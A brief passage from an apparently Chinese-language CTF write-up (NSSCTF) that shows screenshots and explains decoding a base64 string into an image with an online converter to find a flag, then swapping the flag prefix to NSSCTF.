![1762327985362](images/NSS/1762327985362.png)

我们尝试将base64转图片

(base64转图片–网站:https://the-x.cn/zh-cn/encodings/Base64.aspx)

![1762328366236](images/NSS/1762328366236.png)

找到flag,前缀换为NSSCTF就可以

或者可以尝试这么用

![1762328481890](images/NSS/1762328481890.png)

# 45.
